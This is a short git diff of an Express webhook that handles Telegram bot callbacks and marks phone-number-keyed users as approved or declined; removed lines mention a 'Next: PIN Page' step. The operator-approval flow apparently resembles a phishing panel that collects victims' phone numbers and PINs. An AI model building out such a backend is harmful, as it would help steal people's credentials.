@@ -102,26 +102,21 @@ app.post("/webhook", (req, res) => {
   const data = req.body;
 
   if (data.callback_query) {
-    const query = data.callback_query;
-    const action = query.data;
+    const action = data.callback_query.data;
+    const phone = action.split("_")[1];
 
-    let text = "";
-
-    if (action.startsWith("approve")) {
-      text = "✅ Approved\n➡️ Next: PIN Page";
-    } else if (action.startsWith("decline")) {
-      text = "❌ Declined";
+    if (users[phone]) {
+      if (action.startsWith("approve")) {
+        users[phone].status = "approved";
+      } else {
+        users[phone].status = "declined";
+      }
     }
-
-    // Respond back in Telegram
-    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: text
-    });
   }
 
   res.sendStatus(200);
 });
+
 
 // ================= START SERVER =================
 const PORT = process.env.PORT || 8080;
